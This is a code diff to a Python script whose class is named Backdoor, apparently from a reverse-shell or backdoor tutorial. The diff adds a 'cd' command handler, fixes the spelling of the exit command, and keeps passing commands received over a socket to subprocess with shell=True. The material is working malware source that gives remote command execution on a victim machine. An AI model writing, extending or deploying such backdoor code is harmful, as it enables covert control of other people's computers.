@@ -1,6 +1,6 @@
 #!usr/bin/env python3
 
-import socket, json
+import socket, json, os
 import subprocess
 
 
@@ -25,13 +25,20 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def change_current_directory(self, path):
+        os.chdir(path)
+        return "[+] changing working directory to " + path
+
     def run(self):
         while True:
             command = self.reliable_receive()
-            if command[0] == "existbackdoor":
+            if command[0] == "exitbackdoor":
                 self.connection.close()
                 exit()
-            command_result = self.execute_system_command(command)
+            elif command[0] == "cd":
+                command_result = self.change_current_directory(command[1])
+            else:
+                command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
 
 
